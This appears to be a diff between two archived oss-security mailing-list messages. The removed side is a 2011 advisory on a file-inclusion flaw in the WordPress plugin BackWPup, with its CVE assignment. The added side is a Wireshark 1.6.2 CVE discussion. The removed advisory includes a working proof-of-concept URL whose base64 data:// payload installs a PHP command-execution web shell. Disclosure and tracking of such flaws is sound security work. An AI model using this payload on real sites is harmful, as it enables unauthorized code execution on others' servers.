@@ -1,90 +1,42 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/11/22/10
-Message-ID: <4ECBFE1F.2050506@redhat.com>
-Date: Tue, 22 Nov 2011 12:55:11 -0700
-From: Kurt Seifried <kseifried@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/09/14/5
+Message-ID: <17328238.1261288.1316024384673.JavaMail.root@zmail01.collab.prod.int.phx2.redhat.com>
+Date: Wed, 14 Sep 2011 14:19:44 -0400 (EDT)
+From: Josh Bressers <bressers@...hat.com>
 To: oss-security@...ts.openwall.com
-CC: Henri Salo <henri@...v.fi>
-Subject: Re: Fwd: Wordpress plugin BackWPup Remote and Local Code Execution Vulnerability - SOS-11-003
+Cc: Gerald Combs <gerald@...eshark.org>, cve-assign@...re.org
+Subject: Re: CVE Request: Multiple issues fixed in wireshark 1.6.2
 Content-Type: text/plain; charset=utf-8
 
-On 11/22/2011 03:07 AM, Henri Salo wrote:
-> ----- Forwarded message from Lists <lists@...seofsecurity.com.au> -----
->
-> Date: Mon, 28 Mar 2011 15:10:39 +1100
-> From: Lists <lists@...seofsecurity.com.au>
-> To: lists@...seofsecurity.com.au
-> Subject: [Full-disclosure] Wordpress plugin BackWPup Remote and Local Code
-> 	Execution Vulnerability - SOS-11-003
-> X-Mailer: Microsoft Outlook Express 6.00.3790.4657
->
-> Sense of Security - Security Advisory - SOS-11-003
->
-> Release Date.                  28-Mar-2011
-> Last Update.                   -
-> Vendor Notification Date.      25-Mar-2010
-> Product.                       Wordpress Plugin BackWPup
-> Platform.                      Independent
-> Affected versions.             1.6.1 (verified), possibly others
-> Severity Rating.               High
-> Impact.                        System Access
-> Attack Vector.                 Remote without authentication
-> Solution Status.               Upgrade to version 1.7.1
-> CVE reference.                 Not yet assigned
->
-> Details.
-> A vulnerability has been discovered in the Wordpress plugin BackWPup 
-> 1.6.1 which can be exploited to execute local or remote code on the web 
-> server. The Input passed to the component "wp_xml_export.php" via the 
-> "wpabs" variable allows the inclusion and execution of local or remote 
-> PHP files as long as a "_nonce" value is known. The "_nonce" value 
-> relies on a static constant which is not defined in the script meaning 
-> that it defaults to the value "822728c8d9".
->
-> Proof of Concept.
-> wp_xml_export.php?_nonce=822728c8d9&wpabs=data://text/plain;base64,PGZ
-> vcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8%2bIiBtZX           
-> Rob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4Ij48aW5wdXQgdHlwZT0   
-> ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0%2bPHByZT48PyAKZWNobyBgeyRfUE9TVF
-> sneCddfWA7ID8%2bPC9wcmU%2bPD8gZGllKCk7ID8%2bCgo%3d
->
-> Solution.
-> Upgrade to version 1.7.1
->
-> Discovered by.
-> Phil Taylor - Sense of Security Labs.
->
-> Sense of Security Pty Ltd
-> Level 8, 66 King St
-> Sydney NSW 2000
-> AUSTRALIA
-> T: +61 (0)2 9290 4444
-> F: +61 (0)2 9290 4455
-> W: http://www.senseofsecurity.com.au
-> E: info@...seofsecurity.com.au
-> Twitter: @ITsecurityAU
->
-> The latest version of this advisory can be found at:
-> http://www.senseofsecurity.com.au/advisories/SOS-11-003.pdf
->
-> Other Sense of Security advisories can be found at:
-> http://www.senseofsecurity.com.au/research/it-security-advisories.php
-> ----- End forwarded message -----
->
-> Can we assign CVE-identifier for this issue?
+----- Original Message -----
 
-Please use CVE-2011-4342 for this issue.
+> 2. Wireshark Lua script execution vulnerability
+> http://www.wireshark.org/security/wnpa-sec-2011-15.html
+> https://bugzilla.redhat.com/show_bug.cgi?id=737784
 
-> Original advisory: http://seclists.org/fulldisclosure/2011/Mar/328 / http://www.senseofsecurity.com.au/advisories/SOS-11-003
-> Fixed in version: 1.7.2 (http://wordpress.org/support/topic/plugin-backwpup-remote-and-local-codeexecution-vulnerability-sos-11-003)
-> OSVDB: http://osvdb.org/show/osvdb/71481
-> http://www.exploit-db.com/exploits/17056/
->
-> Best regards,
-> Henri Salo
+Use CVE-2011-3360 for the above.
 
+
+Are the below worth assigning CVE ids to? The advisory seems to suggest
+they are crash only fixes. Do those deserve CVE IDs? I know we've been
+fairly generous with wireshark in the past, but I'm wondering if we need to
+draw a line somewhere.
+
+> 
+> 1, Wireshark CSN.1 dissector vulnerability
+> http://www.wireshark.org/security/wnpa-sec-2011-16.html
+> https://bugzilla.redhat.com/show_bug.cgi?id=737783
+> 
+> 3. Wireshark buffer exception handling vulnerability
+> http://www.wireshark.org/security/wnpa-sec-2011-14.html
+> https://bugzilla.redhat.com/show_bug.cgi?id=737785
+> 
+> 4. Wireshark OpenSafety dissector vulnerability
+> http://www.wireshark.org/security/wnpa-sec-2011-12.html
+> https://bugzilla.redhat.com/show_bug.cgi?id=737787
+> 
+
+Thanks.
 
 -- 
-
--Kurt Seifried / Red Hat Security Response Team
-
+    JB
